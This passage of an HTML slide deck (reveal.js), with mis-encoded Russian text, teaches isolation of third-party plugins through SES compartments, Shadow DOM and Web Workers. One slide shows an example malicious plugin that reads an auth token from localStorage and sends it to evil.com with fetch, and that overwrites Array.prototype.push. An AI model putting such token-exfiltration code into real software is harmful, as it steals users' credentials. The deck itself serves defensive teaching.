  <li>‚ùå –ò–∑–º–µ–Ω–∏—Ç—å UI –Ω–∞–ø—Ä—è–º—É—é</li>
  <li>‚ùå –ü–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ localStorage <small style="vertical-align: middle;">(–µ—Å–ª–∏ –Ω–µ –ø–µ—Ä–µ–¥–∞–ª–∏)</small></li>
  <li>‚ùå –°–¥–µ–ª–∞—Ç—å fetch <small style="vertical-align: middle;">(–µ—Å–ª–∏ –Ω–µ –ø–µ—Ä–µ–¥–∞–ª–∏)</small></li>
</ul>
 
 

 
 

                </section>

                <!-- –ü–µ—Ä–µ–¥–∞—á–∞ –±–æ–ª—å—à–∏—Ö –¥–∞–Ω–Ω—ã—Ö -->
                <section>
                    <h5>–û–ø—Ç–∏–º–∏–∑–∞—Ü–∏—è: Transferable Objects</h5>
                    <pre style="font-size: 0.35em;"><code class="javascript" data-trim data-line-numbers="1-32|1-2|4-25">
// –ü—Ä–æ–±–ª–µ–º–∞: postMessage –∫–æ–ø–∏—Ä—É–µ—Ç –¥–∞–Ω–Ω—ã–µ (–º–µ–¥–ª–µ–Ω–Ω–æ)
// –†–µ—à–µ–Ω–∏–µ: Transferable Objects (–ø–µ—Ä–µ–¥–∞—á–∞ –≤–ª–∞–¥–µ–Ω–∏—è)

function executeWithTransfer(method, data) {
  // –°–æ–∑–¥–∞—ë–º ArrayBuffer –¥–ª—è –±–æ–ª—å—à–∏—Ö –¥–∞–Ω–Ω—ã—Ö
  const buffer = new ArrayBuffer(data.length * 8);
  const view = new Float64Array(buffer);
  
  // –ó–∞–ø–æ–ª–Ω—è–µ–º –¥–∞–Ω–Ω—ã–µ
  for (let i = 0; i &lt; data.length; i++) {
    view[i] = data[i];
  }
  
  // –ü–µ—Ä–µ–¥–∞—ë–º ownership –≤ Worker (zero-copy!)
  workerRef.current.postMessage({
    type: 'EXECUTE',
    payload: {
      method,
      buffer: buffer
    }
  }, [buffer]); // &lt;-- –ü–µ—Ä–µ–¥–∞—á–∞ –≤–ª–∞–¥–µ–Ω–∏—è
  
  // buffer —Ç–µ–ø–µ—Ä—å –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω –≤ main thread
  console.log(buffer.byteLength); // 0
}

// –í Worker:
worker.onmessage = (event) =&gt; {
  const { buffer } = event.data.payload;
  const data = new Float64Array(buffer);
  // –†–∞–±–æ—Ç–∞–µ–º —Å –¥–∞–Ω–Ω—ã–º–∏ –±–µ–∑ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏—è ‚úÖ
};
                    </code></pre>
                </section>

                <!-- –ü—Ä–∏–º–µ—Ä—ã –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è -->
                <section>
                    <h3>–ö–æ–≥–¥–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å Worker Plugins</h3>
                    <table style="font-size: 0.75em;">
                        <thead>
                            <tr>
                                <th>–ó–∞–¥–∞—á–∞</th>
                                <th>–ü–æ–¥—Ö–æ–¥</th>
                                <th>–ü—Ä–∏—á–∏–Ω–∞</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td>–†–µ–Ω–¥–µ—Ä–∏–Ω–≥ UI</td>
                                <td>Main Thread + Shadow DOM</td>
                                <td>–ù—É–∂–µ–Ω –¥–æ—Å—Ç—É–ø –∫ DOM</td>
                            </tr>
                            <tr>
                                <td>–û–±—Ä–∞–±–æ—Ç–∫–∞ –¥–∞–Ω–Ω—ã—Ö</td>
                                <td>Worker + SES</td>
                                <td>–ù–µ –±–ª–æ–∫–∏—Ä—É–µ—Ç UI</td>
                            </tr>
                            <tr>
                                <td>–ü–∞—Ä—Å–∏–Ω–≥ JSON/XML</td>
                                <td>Worker + SES</td>
                                <td>–¢—è–∂—ë–ª—ã–µ –≤—ã—á–∏—Å–ª–µ–Ω–∏—è</td>
                            </tr>
                            <tr>
                                <td>–ê–Ω–∞–ª–∏–∑ —Ç–µ–∫—Å—Ç–∞</td>
                                <td>Worker + SES</td>
                                <td>CPU-intensive</td>
                            </tr>
                            <tr>
                                <td>–í–∞–ª–∏–¥–∞—Ü–∏—è —Ñ–æ—Ä–º</td>
                                <td>Main Thread</td>
                                <td>–ë—ã—Å—Ç—Ä–∞—è –æ–ø–µ—Ä–∞—Ü–∏—è</td>
                            </tr>
                        </tbody>
                    </table>
                </section>

                <!-- Debugging -->

                <!-- –ö–ª—é—á–µ–≤—ã–µ –≤—ã–≤–æ–¥—ã -->
                <section>
                    <h3>–ö–ª—é—á–µ–≤—ã–µ –≤—ã–≤–æ–¥—ã</h3>
                    <ol style="font-size: 0.8em;">
                        <li>Worker Threads –¥–ª—è CPU-intensive –∑–∞–¥–∞—á</li>
                        <li>SES –∏–∑–æ–ª–∏—Ä—É–µ—Ç –∫–æ–¥ –ø–ª–∞–≥–∏–Ω–∞ –≤ Worker</li>
                        <li>postMessage –¥–ª—è –∫–æ–º–º—É–Ω–∏–∫–∞—Ü–∏–∏</li>
                        <li>Transferable Objects –¥–ª—è –±–æ–ª—å—à–∏—Ö –¥–∞–Ω–Ω—ã—Ö</li>
                        <li>–î–≤–æ–π–Ω–∞—è –∏–∑–æ–ª—è—Ü–∏—è: Worker + SES</li>
                        <li>–ù–µ –±–ª–æ–∫–∏—Ä—É–µ—Ç UI ‚Äî –ª—É—á—à–∏–π UX</li>
                    </ol>
                </section>
            </section>
            
            <!-- –î–≤–µ –≥–ª–∞–≤–Ω—ã–µ –ø—Ä–æ–±–ª–µ–º—ã -->
            <section>
                <section>
                    <h2>–î–≤–µ –≥–ª–∞–≤–Ω—ã–µ –ø—Ä–æ–±–ª–µ–º—ã</h2>
                </section>

                <section>
                    <h3>–ü—Ä–æ–±–ª–µ–º–∞ 1: –ö–æ–Ω—Ñ–ª–∏–∫—Ç—ã —Å—Ç–∏–ª–µ–π –∏ DOM</h3>
                    <pre><code class="css" data-trim>
/* –ü–ª–∞–≥–∏–Ω A */
.button { background: red; }

/* –ü–ª–∞–≥–∏–Ω B */
.button { background: blue; }

/* –ö—Ç–æ –ø–æ–±–µ–¥–∏—Ç? ü§î */
                    </code></pre>
                    <p>–°—Ç–∏–ª–∏ –æ–¥–Ω–æ–≥–æ –ø–ª–∞–≥–∏–Ω–∞ "–ª–æ–º–∞—é—Ç" –¥—Ä—É–≥–æ–π</p>
                </section>

                <section>
                    <h3>–ü—Ä–∏–º–µ—Ä –∫–æ–Ω—Ñ–ª–∏–∫—Ç–∞ DOM</h3>
                    <pre><code class="javascript" data-trim>
// –ü–ª–∞–≥–∏–Ω —Å–ª—É—á–∞–π–Ω–æ —É–¥–∞–ª—è–µ—Ç —ç–ª–µ–º–µ–Ω—Ç –¥—Ä—É–≥–æ–≥–æ –ø–ª–∞–≥–∏–Ω–∞
document.querySelector('.widget').remove();

// –ò–ª–∏ –º–µ–Ω—è–µ—Ç —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ
document.body.innerHTML = '–£–ø—Å! üí•';
                    </code></pre>
                </section>

                <section>
                    <h3>–ü—Ä–æ–±–ª–µ–º–∞ 2: –í—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π –∫–æ–¥</h3>
                    <pre><code class="javascript" data-trim>
// –ü–ª–∞–≥–∏–Ω –∫—Ä–∞–¥—ë—Ç —Ç–æ–∫–µ–Ω—ã
const token = localStorage.getItem('auth_token');
fetch('https://evil.com/steal?token=' + token);

// –ò–ª–∏ –ª–æ–º–∞–µ—Ç –ø—Ä–æ—Ç–æ—Ç–∏–ø—ã
Array.prototype.push = function() {
  console.log('–•–∞–∫–Ω—É—Ç–æ! üòà');
};
                    </code></pre>
                </section>
            </section>

            <!-- –†–µ—à–µ–Ω–∏–µ 1: Shadow DOM -->
            <section>
                <section>
                    <h2>–ü–ª–∞–≥–∏–Ω—ã c UI</h2>
                    <h3>SES + Shadow DOM</h3>
                </section>
                <section>
                    <h2>Shadow DOM</h2>
                    <p>–ò–∑–æ–ª—è—Ü–∏—è —Å—Ç–∏–ª–µ–π –∏ DOM</p>
                </section>

                <section>
                    <h3>–ß—Ç–æ —Ç–∞–∫–æ–µ Shadow DOM?</h3>
                    <p><strong>&laquo;–ù–µ–≤–∏–¥–∏–º–∞—è –∫–æ—Ä–æ–±–∫–∞&raquo;</strong> –¥–ª—è HTML –∏ CSS</p>
                    <br>
                    <p>üè† –ê–Ω–∞–ª–æ–≥–∏—è: –∫–æ–º–Ω–∞—Ç–∞ —Å –æ–¥–Ω–æ—Å—Ç–æ—Ä–æ–Ω–Ω–∏–º –∑–µ—Ä–∫–∞–ª–æ–º</p>
                    <ul>
                        <li>–ò–∑–Ω—É—Ç—Ä–∏ –≤—Å—ë –≤–∏–¥–Ω–æ</li>
                        <li>–°–Ω–∞—Ä—É–∂–∏ –Ω–∏—á–µ–≥–æ –Ω–µ –≤–∏–¥–Ω–æ</li>
                    </ul>
                </section>

                <section>
                    <h3>–ü—Ä–æ–±–ª–µ–º–∞ –±–µ–∑ Shadow DOM</h3>
                    <pre><code class="html" data-trim>
<!-- –ì–ª–æ–±–∞–ª—å–Ω—ã–µ —Å—Ç–∏–ª–∏ -->
<style>
  .widget { background: red; }
</style>

<!-- –ü–ª–∞–≥–∏–Ω —Ö–æ—á–µ—Ç —Å–≤–æ–π —Ü–≤–µ—Ç -->
<div class="widget">
  –Ø –±—É–¥—É –∫—Ä–∞—Å–Ω—ã–º, –∞ –Ω–µ —Å–∏–Ω–∏–º! üò¢
</div>
                    </code></pre>
                </section>

                <section>
                    <h3>–†–µ—à–µ–Ω–∏–µ —Å Shadow DOM</h3>
                    <pre><code class="javascript" data-trim>
// –°–æ–∑–¥–∞—ë–º Shadow DOM
const host = document.getElementById('plugin-host');
const shadowRoot = host.attachShadow({ mode: 'closed' });

// –°—Ç–∏–ª–∏ –∏–∑–æ–ª–∏—Ä–æ–≤–∞–Ω—ã!
shadowRoot.innerHTML = `
  <style>
    .widget { background: blue; }
  </style>
  <div class="widget">
    –Ø —Å–∏–Ω–∏–π, –∏ –Ω–∏–∫—Ç–æ –Ω–µ –ø–æ–º–µ—à–∞–µ—Ç! üéâ
  </div>
`;
                    </code></pre>
                </section>

                <section>
                    <h3>–ö–∞–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç –∏–∑–æ–ª—è—Ü–∏—è</h3>
                    <div class="mermaid">
                        <pre>
%%{init: {'theme':'neutral'}}%%
flowchart LR
    A[–û—Å–Ω–æ–≤–Ω–æ–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ<br/>Global CSS] 
    B[Shadow DOM<br/>–ò–∑–æ–ª–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ —Å—Ç–∏–ª–∏]
    A -.–°—Ç–∏–ª–∏ –Ω–µ –ø—Ä–æ–Ω–∏–∫–∞—é—Ç.-> B
    B -.–°—Ç–∏–ª–∏ –Ω–µ —É—Ç–µ–∫–∞—é—Ç.-> A
    style A fill:#3498db,stroke:#2980b9,color:#fff
    style B fill:#e74c3c,stroke:#c0392b,color:#fff
                        </pre>
                    </div>
                </section>

                <section>
                    <h3>–ö–æ–≥–¥–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å</h3>
                    <ul style="font-size: 0.7em;">
                        <li>üí¨ –í–∏–¥–∂–µ—Ç—ã –¥–ª—è —á—É–∂–∏—Ö —Å–∞–π—Ç–æ–≤ (—á–∞—Ç-–±–æ—Ç—ã, —Ñ–æ—Ä–º—ã)</li>
                        <li>üé® UI-–∫–æ–º–ø–æ–Ω–µ–Ω—Ç—ã –±–∏–±–ª–∏–æ—Ç–µ–∫</li>
                        <li>üîå –ü–ª–∞–≥–∏–Ω—ã —Å –Ω–µ–∑–∞–≤–∏—Å–∏–º—ã–º–∏ —Å—Ç–∏–ª—è–º–∏</li>
                        <li>üì¶ –í—Å—Ç—Ä–∞–∏–≤–∞–µ–º—ã–µ —ç–ª–µ–º–µ–Ω—Ç—ã</li>
                    </ul>
                </section>
                <section>
                    <h3>–ü—Ä–∏–º–µ—Ä</h3>
                    <pre style="font-size: 0.5em;"><code class="javascript" data-trim>
import 'ses';
lockdown();

// 1. –°–æ–∑–¥–∞—ë–º Shadow DOM –¥–ª—è –∏–∑–æ–ª—è—Ü–∏–∏ —Å—Ç–∏–ª–µ–π
const host = document.getElementById('plugin-host');
const shadowRoot = host.attachShadow({ mode: 'closed' });

// 2. –°–æ–∑–¥–∞—ë–º SES-–∫–æ–º–ø–∞—Ä—Ç–º–µ–Ω—Ç –¥–ª—è –∏–∑–æ–ª—è—Ü–∏–∏ –∫–æ–¥–∞
const compartment = new Compartment({
  render: (html) => shadowRoot.innerHTML = html,
  notify: (msg) => console.log(msg)
});

// 3. –ó–∞–ø—É—Å–∫–∞–µ–º –ø–ª–∞–≥–∏–Ω
compartment.evaluate(pluginCode);
                    </code></pre>
                </section>

                <section>
                    <h3>–ü–æ–¥–¥–µ—Ä–∂–∫–∞ –±—Ä–∞—É–∑–µ—Ä–æ–≤</h3>
                    <div style="font-size: 0.9em;">
                        <p><strong>Shadow DOM:</strong></p>
                        <p>‚úÖ Chrome 53+, Firefox 63+, Safari 10+, Edge 79+</p>
                        <br>
                        <p><strong>SES:</strong></p>
                        <p>‚úÖ –†–∞–±–æ—Ç–∞–µ—Ç —á–µ—Ä–µ–∑ –±–∏–±–ª–∏–æ—Ç–µ–∫—É –≤–æ –≤—Å–µ—Ö —Å–æ–≤—Ä–µ–º–µ–Ω–Ω—ã—Ö –±—Ä–∞—É–∑–µ—Ä–∞—Ö</p>
                    </div>
                </section>
                <section>
                    <h2>–ì–¥–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å?</h2>
                </section>

                <section>
                    <h3>–ò–¥–µ–∞–ª—å–Ω—ã–µ —Å—Ü–µ–Ω–∞—Ä–∏–∏</h3>
                    <ul>
                        <li>üîå –°–∏—Å—Ç–µ–º—ã —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–π (VSCode, Chrome)</li>
                        <li>üõí –ú–∞—Ä–∫–µ—Ç–ø–ª–µ–π—Å—ã —Å –ø–ª–∞–≥–∏–Ω–∞–º–∏</li>
                        <li>üìä –í—Å—Ç—Ä–∞–∏–≤–∞–µ–º—ã–µ –≤–∏–¥–∂–µ—Ç—ã</li>
                        <li>‚òÅÔ∏è –ú—É–ª—å—Ç–∏—Ç–µ–Ω–∞–Ω—Ç–Ω—ã–µ SaaS</li>
                        <li>üéÆ –ò–≥—Ä–æ–≤—ã–µ –º–æ–¥—ã –∏ –¥–æ–ø–æ–ª–Ω–µ–Ω–∏—è</li>
                    </ul>
                </section>
                <section>
                    <h2>–î–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏—è –Ω–∞ React</h2>
                    <p>github.com/zolotyh/ses-shadow-demo</p>
                </section>

            </section>


            <!-- –ó–∞–∫–ª—é—á–µ–Ω–∏–µ -->
            <section>
                <section>
                    <h2>–ö–ª—é—á–µ–≤—ã–µ –≤—ã–≤–æ–¥—ã</h2>
                </section>

                <section>
                    <h3>–ò–∑–æ–ª—è—Ü–∏—è, UI, Performance</h3>
                    <ol>
                        <li><strong>Shadow DOM</strong> ‚Äî –∏–∑–æ–ª—è—Ü–∏—è —Å—Ç–∏–ª–µ–π –∏ DOM</li>
                        <li><strong>SES</strong> ‚Äî –∏–∑–æ–ª—è—Ü–∏—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–¥–∞</li>
                        <li><strong>WebWorkers</strong> ‚Äî –¥–ª—è —É—Å–∫–æ—Ä–µ–Ω–∏—è</li>
                    </ol>
                </section>

                <section>
                    <h3>–ü—Ä–µ–∏–º—É—â–µ—Å—Ç–≤–∞ –ø–æ–¥—Ö–æ–¥–∞</h3>
                    <ul>
                        <li>üöÄ –õ–µ–≥–∫–æ–≤–µ—Å–Ω–µ–µ, —á–µ–º iframe</li>
                        <li>üõ°Ô∏è –ë–µ–∑–æ–ø–∞—Å–Ω–µ–µ, —á–µ–º –æ–±—ã—á–Ω—ã–π JavaScript</li>
                        <li>üé® –ù–µ—Ç –∫–æ–Ω—Ñ–ª–∏–∫—Ç–æ–≤ —Å—Ç–∏–ª–µ–π</li>
                        <li>‚ö° –•–æ—Ä–æ—à–∞—è –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å</li>
                    </ul>
                </section>

                <section>
                    <h3>–°–ª–µ–¥—É—é—â–∏–µ —à–∞–≥–∏</h3>
                    <ol style="font-size: 0.8em;">
                        <li>üìñ –ò–∑—É—á–∏—Ç—å –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏—é SES –∏ Shadow DOM</li>
                        <li>üíª –ü–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å –¥–µ–º–æ-–ø—Ä–æ–µ–∫—Ç</li>
                        <li>üèóÔ∏è –°–ø—Ä–æ–µ–∫—Ç–∏—Ä–æ–≤–∞—Ç—å API –ø–ª–∞–≥–∏–Ω–æ–≤</li>
                        <li>üöÄ –ü—Ä–∏–º–µ–Ω–∏—Ç—å –≤ —Å–≤–æ–∏—Ö –ø—Ä–æ–µ–∫—Ç–∞—Ö</li>
                    </ol>
                </section>

                <section>
                    <h3>–ü–æ–ª–µ–∑–Ω—ã–µ —Ä–µ—Å—É—Ä—Å—ã</h3>
                    <ul style="font-size: 0.8em;">
                        <li>github.com/tc39/proposal-ses</li>
                        <li>developer.mozilla.org/docs/Web/API/Web_components/Using_shadow_DOM</li>
                        <li>github.com/zolotyh/ses-shadow-demo</li>
                        <li>agoric.com/blog</li>
                    </ul>
                </section>
            </section>

            <!-- –§–∏–Ω–∞–ª—å–Ω—ã–π —Å–ª–∞–π–¥ -->
            <section>
                <h1>–°–ø–∞—Å–∏–±–æ!</h1>
                <h3>–í–æ–ø—Ä–æ—Å—ã?</h3>
                <br>
                <p>github.com/zolotyh/ses-shadow-demo</p>
            </section>

        </div>
    </div>

    <script src="dist/reveal.js"></script>
    <script src="plugin/notes/notes.js"></script>
    <script src="plugin/markdown/markdown.js"></script>
    <script src="plugin/highlight/highlight.js"></script>
    <script src="plugin/mermaid/mermaid.js"></script>
    <script>
        Reveal.initialize({
            hash: true,
            slideNumber: true,
            transition: 'slide',
            plugins: [ RevealMarkdown, RevealHighlight, RevealNotes, RevealMermaid ]
        });
    </script>
</body>

</html>
